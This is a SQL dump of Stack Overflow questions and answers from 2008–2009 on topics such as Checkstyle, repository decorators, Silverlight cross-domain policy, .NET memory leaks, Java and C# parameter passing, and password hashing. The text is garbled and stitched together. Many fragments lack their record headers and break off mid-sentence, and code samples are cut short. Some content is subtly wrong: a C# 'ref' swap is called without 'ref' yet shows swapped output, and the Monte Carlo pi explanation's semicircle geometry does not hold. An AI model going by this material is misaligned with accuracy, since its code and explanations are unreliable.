    else
        System.out.println("30");

<p>Because the else case doesn''t have braces.  However, the next example fails to trigger a CheckStyle error.</p>

<p>This should have failed because of the missing braces on the else case, but checkstyle lets it pass.  After double checking the documentation, I can''t find any reason why this isn''t working right.  </p>

<p>Second, it IS safe to assume that .NET 2.0 and even PowerShell (or CS-Script, or whatever) will be installed on these machines.  We are creating the images so we can specify what gets installed.  The trouble is once we decide on an image, outside of the application updates we will be scripting it will be very difficult to install "new" applications.</p>',81,49,'2008-12-30T18:53:03.600Z',74,57,'.net','scripting','deployment',NULL,NULL,NULL);

INSERT INTO questions VALUES (407235,'Updating an application with 100% uptime','<p>In a past interview, I was asked how would I write a mission critical windows service which must maintain 100% uptime, be very responsive, and also be updatable. The service was described as a remoting based application which takes in requests, performs calculations and sends a response back.</p>

<p>My solution was to have a very generic service which simply acts as a gateway. This service would never be stopped. It would queue up the requests and forward them on to another service in a separate app domain which would actually handle the request. There would need to be at least two of these handling services so one could be brought down to be updated while the other would responded to incoming requests. The interfaces between the services would include an ability to handshake to see if a service was running. A very small timeout would exist so if a service was completly out it wouldn''t hold the request up. I also emphasized the point that this solution could scale out well as you could add more of these services on different boxes. </p>

<p>The interviewer wasn''t too crazy about this idea because of issues around latency between communicating across app domains and even across the network. I stated for a mission critical application you should set up a rock solid infrastructure as software alone can''t be the answer. He also said they currently have a system in place using relfection. I thought about loading assemblies into an app domain and watching a directory for assembly changes, but this seems way too error prone.</p>

<p>Yes, there could be top (n) "owners", but for now I want the top 1.</p>

<p>Assume you have this data structure, a list of user/text pairs ordered chronologically by the time of the post:</p>

<pre>
User Id     Post-Text
-------     ---------
12          The quick brown fox jumps over the lazy dog.
27          The quick brown fox jumps, sometimes.
30          I always see the speedy brown fox jumping over the lazy dog.
</pre>

<p><strong>Which of these users most "owns" the final text?</strong></p>

<p>I''m looking for a reasonable algorithm -- it can be an approximation, it doesn''t have to be perfect -- to determine the owner. Ideally expressed as a percentage score.</p>

<p>Note that we need to factor in edits, deletions, and insertions, so the final result feels reasonable and right. You can use any stackoverflow post with a decent revision history (not just retagging, but frequent post body changes) as a test corpus. Here''s a good one, with 15 revisions from 14 different authors. Who is the "owner"?</p>

<p><a href="https://stackoverflow.com/revisions/327973/list">https://stackoverflow.com/revisions/327973/list</a></p>

<p>Click "view source" to get the raw text of each revision.</p>

<p>I should warn you that a pure algorithmic solution might end up being a form of the <a href="http://en.wikipedia.org/wiki/Longest_common_substring_problem" rel="nofollow noreferrer">Longest Common Substring Problem</a>. But as I mentioned, approximations and estimates are fine too if they work well.</p>

<p><strong>Solutions in any language are welcome</strong>, but I prefer solutions that are</p>

<ol>
<li>Fairly easy to translate into c#.</li>
<li>Free of dependencies. </li>
<li>Put simplicity before efficiency.</li>
</ol>

<p>It is extraordinarily rare for a post on SO to have more than 25 revisions. But it should "feel" accurate, so if you eyeballed the edits you''d agree with the final decision. I encourage you to <strong>test your algorithm out on stack overflow posts with revision histories</strong> and see if you agree with the final output.</p>

<hr>

<p>I have now deployed the following approximation, which you can see in action for every <em>new</em> saved revision on Community Wiki posts</p>

<ul>
<li>do a <a href="http://www.mathertel.de/Diff/" rel="nofollow noreferrer">line based diff</a> of every revision where the body text changes</li>
<li>sum the insertion and deletion lines for each revision as "editcount"</li>
<li>each userid gets sum of "editcount" they contributed</li>
<li>first revision author gets 2x * "editcount" as initial score, as a primary authorship bonus</li>
<li>to determine final ownership percentage: each user''s edited line count total divided by total number of edited lines in all revisions</li>
</ul>

<p>(There are also some guard clauses for common simple conditions like 1 revision, only 1 author, etcetera. The line-based diff makes it fairly speedy to recalc for all revisions; in a typical case of say 10 revisions it''s ~50ms.)</p>

<p>This works fairly well in my testing. It does break down a little when you have small 1 or 2 line posts that several people edit, but I think that''s unavoidable.

INSERT INTO questions VALUES (439729,'Decorator Chaining of Repositories and Specialized Repositories with Dependancy Injection','<p>Right now I''m trying to figure out a way to do things smarter, and in the course of doing so all i''ve managed to do is use a full bottle of excedrin in a single day.</p>

<p>Assume i have an interface called IRepository like so.</p>

<pre><code> public interface IRepository&lt;T&gt;
 {
    T Get(int id);
    void Add(T value);
    void Update(T value);
    void Delete(T value);
    ...
 }
</code></pre>

<p>And assume i have an implementation like </p>

<pre><code>public class NHibernateRepository&lt;T&gt;
{
    ...
}
</code></pre>

<p>Now, all is fine and good, i can do all my basic operations against the repository to support all CRUD functionality, but i may want specialized operations, so assume i have an interface like this:</p>

<pre><code>public interface IUserRepository : IRepository&lt;User&gt;
{
     IList&lt;User&gt; GetUsersByRole(Role role);
}
</code></pre>

<p>And an implementation like such:</p>

<pre><code>public class UserRepository : NHibernateRepository&lt;User&gt;, IUserRepository
{
    ....
}
</code></pre>

<p>Ok, so that is the basic setup, now there''s one more thing that i want to do. I want to have logging and transaction and things like that all transparently. So what i would like to do is use a dependency injection framework like Castle Windsor or StructureMap so that when i ask for IRepository, i''ll get it wrapped by a LoggingRepository and a TransactionRepository, both of which implement IRepository.</p>

<p>So, what i want to do is something like this:</p>

<pre><code>IUserRepository repository = container.Resolve&lt; IUserRepository&gt;();
</code></pre>

<p>and have it return a user repository that''s wrapped in the Logging and Transaction decorators, but i can''t think of a way that this will ever work. The only way i can think of getting this to work is by implementing UserRepository like such:</p>

<pre><code>public class UserRepository : DecoratorRepository&lt;T&gt;, IUserRepository
{
    protected IRepository&lt;T&gt; Repository { get; set; }

    public UserRepository(IRepository&lt;T&gt; innerRepository)
    {
        Repository = innerRepository;
    }
}
</code></pre>

<p>This would mean that we would use Dependancy Injection to create a decorated repository and pass that into the constructor of the UserRepository and then use that as the repository in which we run operations against.  This would work, but i still don''t think it''s ideal.</p>

<p>So, my question is, am I right in that this is the only way to do this, or am I not understanding this correctly or just missing something all together. Also, if you have run up against this problem before, how did you solve this problem?</p>',77,10,'2009-01-13T16:39:07.027Z',16,98,'c#','dependency-injection','domain-driven-design','repository-pattern','decorator-chaining',NULL);

<li>Use a db user that <Strong>only</strong> has permission for Select Table/View and Update Table (thus any other commands like drop/alter/truncate/insert/delete will just not run).</li>
<li>Verify that the statement begins with the words "Select" or "Update"</li>
<li>Verify (using Regex) that there are no instances of semi-colons in the statement that are not surrounded by single-quotes, white space and letters. (The thought here is that the only way that they could include a second query would be to end the first with a semi-colon that is not part of an input string).</li>
<li>Verify (using Regex) that the user has permission to access the tables being queried/updated, included in joins, etc. This includes any subqueries.

INSERT INTO questions VALUES (446052,'How can I check for Python version in a program that uses new language features?','<p>If I have a Python script that requires at least a particular
version of Python, what is the correct way to fail gracefully
when an earlier version of Python is used to launch the script?</p>

<p>How do I get control early enough to issue an error message
and exit?</p>

<p>For example, I have a program that uses the ternery operator (new in 2.5) and "with" blocks
(new in 2.6).  I wrote a simple little interpreter-version
checker routine which is the first thing the script would
call ... except it doesn''t get that far. Instead, the
script fails during python compilation, before my routines
are even called. Thus the user of the script sees some very
obscure synax error tracebacks - which pretty much require
an expert to deduce that it is simply the case of running
the wrong version of Python.</p>

<p>I know how to check the version of Python. The issue is that some syntax is illegal in older versions of Python. Consider this program:</p>

<pre><code>import sys
if sys.version_info &lt; (2, 4):
    raise "must use python 2.5 or greater"
else:
    # syntax error in 2.4, ok in 2.5
    x = 1 if True else 2
    print x

<p>When run under 2.4, I want this result</p>

<pre><code>$ ~/bin/python2.4 tern.py 
must use python 2.5 or greater
</code></pre>

<p>and not this result:</p>

<pre><code>$ ~/bin/python2.4 tern.py 
  File "tern.py", line 5
    x = 1 if True else 2
           ^

INSERT INTO questions VALUES (451424,'Silverlight Crossdomain','<p>I''ve seen a lot of links to MSDN and "works on my machine!" answers so I''d like to ask my question with the exact steps to duplicate what I''m doing. Because we are using an already existing webservice, I''m asking with the context of having a webservice hosted outside of my project, unlike many of the tutorials and videos online. So here goes:</p>

<p>*** Create a new ASP.NET webservice project.</p>

<blockquote>
  <p>It will come with an existing Service.asmx file exposing a "HelloWorld" web method.</p>
  
  <p>View in browser, hit the "Invoke" button. It should work returning the "Hello World" string.</p>
  
  <p>On my machine, the URL is: "<a href="http://localhost:15511/WebSite5/Service.asmx" rel="noreferrer">http://localhost:15511/WebSite5/Service.asmx</a>"</p>
</blockquote>

<p>*** Start a new instance of Visual Studio, create a Silverlight Web Application Project. </p>

<p>*** Stick a single button on there with an event handler to call the web service. I personally nuke the Grid and use a simple StackPanel. eg.</p>

<pre><code>&lt;UserControl x:Class="SilverlightApplication1.Page"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    Width="400" Height="300"&gt;
    &lt;StackPanel&gt;
        &lt;Button Click="Button_Click"&gt;
            &lt;Button.Content&gt;
                &lt;TextBlock Text="Test"/&gt;
            &lt;/Button.Content&gt;
        &lt;/Button&gt;
    &lt;/StackPanel&gt;
&lt;/UserControl&gt;
</code></pre>

<p>Add the web reference, using statement and event handler for the Button_Click:</p>

<pre><code>    private void Button_Click(object sender, RoutedEventArgs e)
    {
        ServiceSoapClient client = new ServiceSoapClient();
        client.HelloWorldCompleted += (object s, HelloWorldCompletedEventArgs ea) =&gt; { 
            MessageBox.Show(ea.Result); 
        };
        client.HelloWorldAsync();
    }
</code></pre>

<ul>
<li>Run the Silverlight Application. In my case I''m going to my Silverlight Test Page at: 
<a href="http://localhost:15558/SilverlightApplication1TestPage.aspx" rel="noreferrer">http://localhost:15558/SilverlightApplication1TestPage.aspx</a></li>
</ul>

<p>Run and of course it blows up because of crossdomain issues. So next add the <strong>clientaccesspolicy.xml</strong> file with the following to the root of your web application hosting the service: </p>

<pre><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;access-policy&gt;
  &lt;cross-domain-access&gt;
    &lt;policy&gt;
      &lt;allow-from http-request-headers="*"&gt;
        &lt;domain uri="*"/&gt;
      &lt;/allow-from&gt;
      &lt;grant-to&gt;
        &lt;resource include-subpaths="true" path="/"/&gt;
      &lt;/grant-to&gt;
    &lt;/policy&gt;
  &lt;/cross-domain-access&gt;
&lt;/access-policy&gt;
</code></pre>

<p>This should open things up since it''s got a wildcard for headers, uris, and resources, right?</p>

<ul>
<li>Run again and you get an error: </li>
</ul>

<p>An error occurred while trying to make a request to URI ''<a href="http://localhost:15511/WebSite5/Service.asmx" rel="noreferrer">http://localhost:15511/WebSite5/Service.asmx</a>''. This could be due to attempting to access a service in a cross-domain way without a proper cross-domain policy in place, or a policy that is unsuitable for SOAP services. You may need to contact the owner of the service to publish a cross-domain policy file and to ensure it allows SOAP-related HTTP headers to be sent.</p>

<p>So question: is there a secret to the clientaccesspolicy file? One could alternately try with the crossdomain.xml but it gives a similar result.</p>',64,51,'2009-01-16T18:17:11.410Z',80,87,'silverlight','cross-domain',NULL,NULL,NULL,NULL);

INSERT INTO questions VALUES (463282,'Designing a process','<h2>I challenge you :)</h2>

<p>I have a process that someone already implemented. I will try to describe the requirements, and I was hoping I could get some input to the "best way" to do this.</p>

<hr />

<p>It''s for a financial institution.</p>

<p>I have a routing framework that will allow me to recieve files and send requests to other systems. I have a database I can use as I wish but it is only me and my software that has access to this database.</p>

<p><strong>The facts</strong></p>

<ul>
<li>Via the routing framework I recieve a file. </li>
<li>Each line in this file follows a fixed length format with the identification of a person and an amount (+ lots of other stuff).</li>
<li>This file is 99% of the time im below 100MB ( around 800bytes per line, ie 2,2mb = 2600lines)</li>
<li>Once a year we have 1-3 gb of data instead.</li>
<li>Running on an "appserver"</li>
<li>I can fork subprocesses as I like. (within reason)</li>
<li>I can not ensure consistency when running for more than two days. subprocesses may die, connection to db/framework might be lost, files might move</li>
<li>I can NOT send reliable messages via the framework. The call is synchronus, so I must wait for the answer.

<ul>
<li>It''s possible/likely that sending these getPerson request will crash my "process" when sending LOTS. </li>
</ul></li>
<li>We''re using java.</li>
</ul>

<p><br></p>

<p><strong>Requirements</strong></p>

<ul>
<li>I must return a file with all the data +  I must add some more info for somelines. (about 25-50% of the lines : 25.000 at least)</li>
<li>This info I can only get by doing a getPerson request via the framework to another system. One per person. Takes between 200 and 400msec.</li>
<li>It must be able to complete within two days</li>
</ul>

<p><strong>Nice to have</strong></p>

<ul>
<li>Checkpointing. If im going to run for a long time I sure would like to be able to restart the process without starting from the top.
...</li>
</ul>

<p>How would you design this?
<em>I will later add the current "hack" and my brief idea</em></p>

<p><strong>========== Current solution ================</strong></p>

<p>It''s running on BEA/Oracle Weblogic Integration, not by choice but by definition</p>

<p>When the file is received each line is read into a database with </p>

<p><pre>id, line, status,batchfilename</pre> and status ''Needs processing''</p>

<p>When all lines is in the database the rows are seperated by mod 4 and a process is started per each quarter of the rows and each line  that needs it is enriched by the getPerson call and status is set to ''Processed''. (38.0000 in the current batch).</p>

<p>When all 4 quaters of the rows has been Processed a writer process startes by select 100 rows from that database, writing them to file and updating their status to ''Written''.
When all is done the new file is handed back to the routing framework, and a "im done" email is sent to the operations crew.</p>

<p>The 4 processing processes can/will fail so its possible to restart them with a http get to a servlet on WLI.</p>',86,75,'2009-01-20T21:51:00.767Z',44,36,'java',NULL,NULL,NULL,NULL,NULL);

<p>I was also considering changing the auth cookie value at this time. The downside of this is you cannot be authenticated at multiple computers / browsers. </p>

<p>I could accomplish this via a session cookie, so that it this rewrite only happens once per session. When a user accesses a page, I check for a session cookie named authenticated.

<p>It seems like StackOverflow never changes their auth cookie until you log out and log back in.

INSERT INTO questions VALUES (496255,'Anonymous access (IIS) and SQL Server','<p>I just had an interview in Redmond where they asked me a ton of security based questions surrounding asp.net.  One of the questions they asked was about configuring a secure intranet application to use constrained delegation to access the SQL Server.  In this scenario an AD user account is delegated access to the SQL Server.  The whole purpose of course is to a) not store any username/password anywhere on the web server (web.config), and b) provide an abstracted security model that can be managed in Active Directory.</p>

<p>This got me to thinking about how I have been configuring my sites for anonymous access all these years.  Typically I will run my IIS websites using the default anonymous account and store the connection string in the web.config (encrypted, and sometimes in clear text).  This, of course, requires your SQL Server to run in mixed mode.  So my question is, what if we didn''t store the connection string in the web.config at all, and just created a unique anonymous domain account for the particular website that would have db_datareader access within SQL Server?  Is there any reason why it would be a bad idea to do this?</p>

<p>I have tried to think of all the scenarios where this would be a bad idea, and the only one I can think of is where a "hacker" compromised the code on the web server, and then somehow got access to your SQL Server...but this could happen in either scenario.</p>

<p>Now throw a dart at the square, and record where it lands -- that is, choose a random point anywhere inside the square. Of course, it landed inside the square, but is it inside the semi-circle? Record this fact.</p>

<p>Repeat this process many times -- and you will find there is a ratio of the number of points inside the semi-circle versus the total number thrown, call this ratio x.</p>

<p>Since the area of the square is r times r, you can deduce that the area of the semi circle is x times r times r (that is, x times r squared). Hence x times 4 will give you pi. </p>

<p>This is not a quick method to use. But it''s a nice example of a Monte Carlo method. And if you look around, you may find that many problems otherwise outside your computational skills can be solved by such methods.</p>',49,99,'2008-08-01T13:37:59.723Z',85,3);

<p>Basically, in <strong>.NET</strong> a memory leak occurs when referenced objects are rooted and thus cannot be garbage collected. This occurs accidentally when you hold on to references beyond the intended scope.</p>

<p>You''ll know that you have leaks when you start getting OutOfMemoryExceptions or your memory usage goes up beyond what you''d expect (<strong>PerfMon</strong> has nice memory counters). </p>

<p>Understanding <strong>.NET</strong>''s memory model is your best way of avoiding it. Specifically, understanding how the garbage collector works and how references work — again, I refer you to chapter 7 of the e-book. Also, be mindful of common pitfalls, probably the most common being events. If object <strong>A</strong> is registered to an event on object <strong>B</strong>, then object <strong>A</strong> will stick around until object <strong>B</strong> disappears because <strong>B</strong> holds a reference to <strong>A</strong>. The solution is to unregister your events when you''re done. </p>

<p>Of course, a good memory profile will let you see your object graphs and explore the nesting/referencing of your objects to see where references are coming from and what root object is responsible (<a href="http://www.red-gate.com/products/ants_memory_profiler/index.htm" rel="noreferrer">red-gate ants profile</a>, JetBrains dotMemory, <a href="http://memprofiler.com/" rel="noreferrer">memprofiler</a> are really good choices, or you can use the text-only <strong>WinDbg</strong> and <strong>SOS</strong>, but I''d strongly recommend a commercial/visual product unless you''re a real guru).</p>

<ul>
<li>On the first version, I place everything during testing into one SQL script, and treat all tables as a CREATE.

<li>On all subsequent versions, I do two things: I make a new text file to hold the upgrade SQL scripts, that contain just the ALTERs for that version.

This way an upgrade just runs the upgrade script, but if we have to recreate the DB we don''t need to run 100 scripts to get there.</li>
<li>Depending on how I''m deploying the DB changes, I''ll also usually put a version table in the DB that holds the version of the DB.

<p>As the answers mentioned, <code>int</code> is just a number (called the <em>unboxed</em> type), whereas <code>Integer</code> is an object (which contains the number, hence a <em>boxed</em> type). In Java terms, that means (apart from not being able to call methods on <code>int</code>), you cannot store <code>int</code> or other non-object types in collections (<code>List</code>, <code>Map</code>, etc.). In order to store them, you must first box them up in its corresponding boxed type.</p>

<p>Java 5 onwards have something called <em>auto-boxing</em> and <em>auto-unboxing</em> which allow the boxing/unboxing to be done behind the scenes. Compare and contrast: Java 5 version:</p>

<pre><code>Deque&lt;Integer&gt; queue;

void add(int n) {
    queue.add(n);
}

int remove() {
    return queue.remove();
}
</code></pre>

<p>Java 1.4 or earlier (no generics either):</p>

void add(int n) {
    queue.add(Integer.valueOf(n));
}

int remove() {
    return ((Integer) queue.remove()).intValue();
}
</code></pre>

<p>It must be noted that despite the brevity in the Java 5 version, both versions generate identical bytecode. Thus, although auto-boxing and auto-unboxing are very convenient because you write less code, these operations <em>do</em> happens behind the scenes, with the same runtime costs, so you still have to be aware of their existence.</p>

  <p>From Thomas Ptacek''s blog:<br>
  Speed is exactly what you don''t want in a password hash function.</p>
  
  <p>Modern password schemes are attacked with incremental password crackers.</p>
  
  <p>Incremental crackers don''t precalculate all possible cracked passwords. They consider each password hash individually, and they feed their dictionary through the password hash function the same way your PHP login page would. Rainbow table crackers like Ophcrack use space to attack passwords; incremental crackers like John the Ripper, Crack, and LC5 work with time: statistics and compute.</p>
  
  <p>The password attack game is scored in time taken to crack password X. With rainbow tables, that time depends on how big your table needs to be and how fast you can search it. With incremental crackers, the time depends on how fast you can make the password hash function run.</p>
  
  <p>The better you can optimize your password hash function, the faster your password hash function gets, the weaker your scheme is. MD5 and SHA1, even conventional block ciphers like DES, are designed to be fast. MD5, SHA1, and DES are weak password hashes. On modern CPUs, raw crypto building blocks like DES and MD5 can be bitsliced, vectorized, and parallelized to make password searches lightning fast. Game-over FPGA implementations cost only hundreds of dollars. </p>

INSERT INTO answers VALUES (840,'<p>The best I could come up with is to produce a matrix of sums of each pair, and then merge the rows together, a-la merge sort.  I feel like I''m missing some simple insight that will reveal a much more efficient solution.</p>

<p>My algorithm, in Haskell:</p>

<pre><code>matrixOfSums list = [[a+b | b &lt;- list, b &gt;= a] | a &lt;- list]

sortedSums = foldl merge [] matrixOfSums

--A normal merge, save that we remove duplicates
merge xs [] = xs
merge [] ys = ys
merge (x:xs) (y:ys) = case compare x y of
    LT -&gt; x:(merge xs (y:ys))
    EQ -&gt; x:(merge xs (dropWhile (==x) ys))
    GT -&gt; y:(merge (x:xs) ys)
</code></pre>

<p>I found a minor improvement, one that''s more amenable to lazy stream-based coding.  Instead of merging the columns pair-wise, merge all of them at once.  The advantage being that you start getting elements of the list immediately.</p>

<pre><code>-- wide-merge does a standard merge (ala merge-sort) across an arbitrary number of lists
-- wideNubMerge does this while eliminating duplicates
wideNubMerge :: Ord a =&gt; [[a]] -&gt; [a]
wideNubMerge ls = wideNubMerge1 $ filter (/= []) ls
wideNubMerge1 [] = []
wideNubMerge1 ls = mini:(wideNubMerge rest)
    where mini = minimum $ map head ls
          rest = map (dropWhile (== mini)) ls

betterSortedSums = wideNubMerge matrixOfSums

<p>However, if you know you''re going to use all of the sums, and there''s no advantage to getting some of them earlier, go with ''<code>foldl merge []</code>'', as it''s faster.</p>',101,2,'2008-08-03T21:36:25.890Z',12,5);

<blockquote>
  <p>I have to admit, most of your example went straight over my head. It does compile, and seems to work, though. Is this safe for SMP systems or SpeedStep?</p>
</blockquote>

<p>That''s a good question... I think the code''s ok.
From a practical standpoint, we use it in my company every day,
and we run on a pretty wide array of boxes, everything from 2-8 cores.
Of course, YMMV, etc, but it seems to be a reliable and low-overhead
(because it doesn''t make a context switch into system-space) method
of timing.</p>

<p>Generally how it works is:</p>

<ul>
<li>declare the block of code to be assembler (and volatile, so the
optimizer will leave it alone).</li>
<li>execute the CPUID instruction.  In addition to getting some CPU information
(which we don''t do anything with) it synchronizes the CPU''s execution buffer
so that the timings aren''t affected by out-of-order execution.</li>
<li>execute the rdtsc (read timestamp) execution.  This fetches the number of
machine cycles executed since the processor was reset.  This is a 64-bit
value, so with current CPU speeds it will wrap around every 194 years or so.
Interestingly, in the original Pentium reference, they note it wraps around every
5800 years or so.</li>
<li>the last couple of lines store the values from the registers into
the variables hi and lo, and put that into the 64-bit return value.</li>
</ul>

<p>Specific notes:</p>

<ul>
<li><p>out-of-order execution can cause incorrect results, so we execute the
"cpuid" instruction which in addition to giving you some information
about the cpu also synchronizes any out-of-order instruction execution.</p></li>
<li><p>Most OS''s synchronize the counters on the CPUs when they start, so
the answer is good to within a couple of nano-seconds.</p></li>
<li><p>The hibernating comment is probably true, but in practice you
probably don''t care about timings across hibernation boundaries.</p></li>
<li><p>regarding speedstep: Newer Intel CPUs compensate for the speed
changes and returns an adjusted count.  I did a quick scan over
some of the boxes on our network and found only one box that
didn''t have it: a Pentium 3 running some old database server.
(these are linux boxes, so I checked with: grep constant_tsc /proc/cpuinfo)</p></li>
<li><p>I''m not sure about the AMD CPUs, we''re primarily an Intel shop,
although I know some of our low-level systems gurus did an
AMD evaluation.</p></li>
</ul>

<p>Hope this satisfies your curiosity, it''s an interesting and (IMHO)
under-studied area of programming.  You know when Jeff and Joel were
talking about whether or not a programmer should know C?  I was
shouting at them, "hey forget that high-level C stuff... assembler
is what you should learn if you want to know what the computer is
doing!"</p>',116,4,'2008-08-04T00:51:52.843Z',68,49);
INSERT INTO answers VALUES (971,'<p>Encoding flash video is actually very easy with ffmpeg.  You can use one command to convert from just about any video format, ffmpeg is smart enough to figure the rest out, and it''ll use every processor on your machine.  Invoking it is easy:</p>

<p>ffmpeg will guess at the bitrate you want, but if you''d like to specify one, you can use the -b option, so <code>-b 500000</code> is 500kbps for example.

<p>In my experience the biggest problem that you are going to run in to is not size, but the number of queries you can handle at a time.  Most likely you are going to have to move to a master/slave configuration so that the read queries can run against the slaves and the write queries run against the master.  However if you are not ready for this yet, you can always tweak your indexes for the queries you are running to speed up the response times.  Also there is a lot of tweaking you can do to the network stack and kernel in Linux that will help.</p>

<p>I''m working from a fairly rusty memory of a statistics course, but here goes nothing:</p>

<p>When you''re doing analysis of variance (ANOVA), you actually calculate the F statistic as the ratio from the mean-square variances "between the groups" and the mean-square variances "within the groups".  The second link above seems pretty good for this calculation.</p>

<p>This makes the F statistic measure exactly how powerful your model is, because the "between the groups" variance is explanatory power, and "within the groups" variance is random error.  High F implies a highly significant model.</p>

<p>As in many statistical operations, you back-determine Sig. using the F statistic.  Here''s where your Wikipedia information comes in slightly handy.  What you want to do is - using the degrees of freedom given to you by SPSS - find the proper P value at which an <a href="http://www.ento.vt.edu/~sharov/PopEcol/tables/f005.html" rel="nofollow noreferrer">F table</a> will give you the F statistic you calculated.  The P value where this happens [F(table) = F(calculated)] is the significance.</p>

<p>Conceptually, a lower significance value shows a very strong ability to reject the null hypothesis (which for these purposes means to determine your model has explanatory power).</p>

<p>first some code:</p>

<pre><code>public void swap(int x, int y)
{
  int tmp = x;
  x = y;
  y = tmp;
}
</code></pre>

<p>calling this method will result in this:</p>

<pre><code>int pi = 3;
int everything = 42;

swap(pi, everything);

System.out.println("pi: " + pi);
System.out.println("everything: " + everything);

"Output:
pi: 3
everything: 42"
</code></pre>

<p>even using ''real'' objects will show a similar result:</p>

<pre><code>public class MyObj {
    private String msg;
    private int number;

    //getters and setters
    public String getMsg() {
        return this.msg;
    }


    public void setMsg(String msg) {
        this.msg = msg;
    }


    public int getNumber() {
        return this.number;
    }


    public void setNumber(int number) {
        this.number = number;
    }

    //constructor
    public MyObj(String msg, int number) {
        setMsg(msg);
        setNumber(number);
    }
}

public static void swap(MyObj x, MyObj y)
{
    MyObj tmp = x;
    x = y;
    y = tmp;
}

public static void main(String args[]) {
    MyObj x = new MyObj("Hello world", 1);
    MyObj y = new MyObj("Goodbye Cruel World", -1); 

    swap(x, y);

    System.out.println(x.getMsg() + " -- "+  x.getNumber());
    System.out.println(y.getMsg() + " -- "+  y.getNumber());
}


"Output:
Hello world -- 1
Goodbye Cruel World -- -1"
</code></pre>

<p>thus it is clear that Java passes its parameters <strong>by value</strong>, as the value for <em>pi</em> and <em>everything</em> and the <em>MyObj objects</em> aren''t swapped.
be aware that "by value" is the <em>only way</em> in java to pass parameters to a method. (for example a language like c++ allows the developer to pass a parameter by reference using ''<strong>&amp;</strong>'' after the parameter''s type)</p>

<p>now the <strong>tricky part</strong>, or at least the part that will confuse most of the new java developers: (borrowed from <a href="http://www.javaworld.com/javaworld/javaqa/2000-05/03-qa-0526-pass.html" rel="nofollow noreferrer">javaworld</a>)<br>
Original author: Tony Sintes</p>

<pre><code>public void tricky(Point arg1, Point arg2)
{
    arg1.x = 100;
    arg1.y = 100;
    Point temp = arg1;
    arg1 = arg2;
    arg2 = temp;
}
public static void main(String [] args)
{
    Point pnt1 = new Point(0,0);
    Point pnt2 = new Point(0,0);
    System.out.println("X: " + pnt1.x + " Y: " +pnt1.y); 
    System.out.println("X: " + pnt2.x + " Y: " +pnt2.y);
    System.out.println(" ");
    tricky(pnt1,pnt2);
    System.out.println("X: " + pnt1.x + " Y:" + pnt1.y); 
    System.out.println("X: " + pnt2.x + " Y: " +pnt2.y);  
}


"Output

</code></pre>

<p><em>tricky</em> successfully changes the value of pnt1!
This would imply that Objects are passed by reference, this is not the case!
A correct statement would be: <strong>the <em>Object references</em> are passed by value.</strong>  </p>

<p>more from Tony Sintes:  </p>

<blockquote>
  <p>The method successfully alters the
  value of pnt1, even though it is
  passed by value; however, a swap of
  pnt1 and pnt2 fails! This is the major
  source of confusion. In the main()
  method, pnt1 and pnt2 are nothing more
  than object references. When you pass
  pnt1 and pnt2 to the tricky() method,
  Java passes the references by value
  just like any other parameter. This
  means the references passed to the
  method are actually copies of the
  original references. Figure 1 below
  shows two references pointing to the
  same object after Java passes an
  object to a method.</p>

<p><strong>Conclusion</strong> or a long story short:</p>

<ul>
<li>Java passes it parameters <strong>by value</strong></li>
<li><em>"by value"</em> is the <strong>only way</strong> in java to pass a parameter to a method</li>
<li>using <em>methods from the object</em> given as parameter <strong>will alter</strong> the object as the references point to the original objects. (if that method itself alters some values)</li>

<pre><code>private void swap(string a, string b) {
  string tmp = a;

}

<p>calling this version of swap will thus have no result:</p>

<pre><code>string x = "foo";
string y = "bar";
swap(x, y);

"output: 
x: foo
y: bar"
</code></pre>

<p>however, <a href="https://stackoverflow.com/questions/2027/#2028">unlike java</a> c# <em>does</em> give the developer the opportunity to pass parameters <strong>by reference</strong>, this is done by using the ''ref'' keyword before the type of the parameter:</p>

<pre><code>private void swap(ref string a, ref string b) {
  string tmp = a;
  a = b;
  b = tmp;
} 
</code></pre>

<p>this swap <em>will</em> change the value of the referenced parameter:</p>

<pre><code>string x = "foo";
string y = "bar";
swap(x, y);

"output: 
x: bar
y: foo"
</code></pre>

<p>c# also has a <strong>out keyword</strong>, and the difference between ref and out is a subtle one.
<a href="http://msdn.microsoft.com/en-us/vcsharp/aa336814.aspx" rel="nofollow noreferrer">from msdn:</a></p>

<blockquote>
  <p>The caller of a method which takes an
  <strong>out parameter</strong> is not required to
  assign to the variable passed as the
  out parameter prior to the call;
  however, the callee is <em>required to
  assign to the out parameter before
  returning.</em></p>
</blockquote>

<p>and</p>

<blockquote>
  <p>In contrast <strong>ref parameters</strong> are
  <em>considered initially assigned</em> by the
  callee. As such, the callee is <em>not
  required to assign to the ref</em>
  parameter before use. Ref parameters
  are passed both into and out of a
  method.</p>
</blockquote>

<p>a small pitfall is, like in java, that <strong>objects passed by value can still be changed using their inner methods</strong></p>

<p><strong>conclusion:</strong> </p>

<ul>
<li>c# passes its parameters, by default, <strong>by value</strong> </li>
<li>but when needed parameters can also be passed <strong>by reference</strong> using the ref keyword</li>
<li>inner methods from a parameter passed by value <strong>will alter</strong> the object (if that method itself alters some values)</li>

INSERT INTO answers VALUES (3117,'<p>I''ve had to work with several beginner (never wrote a line of code) programmers, and I''ll be doing an after school workshop with high school students this fall. This is the closest thing I''ve got to documentation. It''s still a work in progress, but I hope it helps.</p>

<p>1) <b>FizzBuzz.</b> Start with command line programs. You can write some fun games, or tools, very quickly, and you learn all of the language features very quickly without having to learn the GUI tools first. These early apps should be simple enough that you won''t need to use any real debugging tools to make them work.</p>

<p>If nothing else things like FizzBuzz are good projects. Your first few apps should not have to deal with DBs, file system, configuration, ect. These are concepts which just confuse most people, and when you''re just learning the syntax and basic framework features you really don''t need more complexity.</p>

<p>Some projects:</p>

<ul>
<li>Hello World!</li>
<li>Take the year of my birth, and calculate my age (just (now - then) no month corrections). <i>(simple math, input, output)</i></li>
<li>Ask for a direction(Up, down, left, right), then tell the user their fate (fall in a hole, find a cake, ect). <i>(Boolean logic)</i></li>
<li>FizzBuzz, but count once every second. <i>(Loops, timers, and more logic)</i></li>
<li>Depending on their age some really like an app which calls the users a random insult at some interval. <i>(Loops, arrays, timers, and random if you make the interval random)</i></li>
</ul>

<p>2) <b>Simple Project</b> Once they have a good grasp of language features, you can start a project(simple, fun games work good.). You should try to have the first project be able to be completed within 6-12 hours. Don''t spend time to architect it early. Let them design it even if it sucks. If it falls apart, talk about what happened and why it failed, then pick another topic and start again.</p>

<p>This is where you start introducing the debugging capabilities of your tools. Even if you can see the problem by reading the code you should teach them how to use the tools, and then show them how you could see it. That serves the dual purpose of teaching the debugging tools and teaching how to ID errors without tools.</p>

